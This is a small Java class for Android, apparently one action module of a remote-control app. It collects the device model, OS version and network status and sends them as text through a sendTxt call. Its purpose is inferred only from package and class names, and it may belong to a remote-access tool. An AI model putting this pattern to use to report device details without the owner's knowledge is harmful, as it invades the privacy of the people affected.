package com.lfish.control.action.actiondomian;

import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.Utils;

public class GetDeviceMsgAction extends BaseBeanAction {

	public GetDeviceMsgAction() {
		super();
		// TODO Auto-generated constructor stub
	}

	@Override
	public void run() {
//		Device.self();
		StringBuffer bf = new StringBuffer();
		bf.append("型号:"+android.os.Build.MODEL);
		bf.append("\r\n");
		bf.append("系统:"+android.os.Build.VERSION.RELEASE);
		bf.append("\r\n");
		bf.append("网络:"+ Utils.GetNetStatus(ControlApplication.context));
		sendTxt(bf.toString());
	}
}
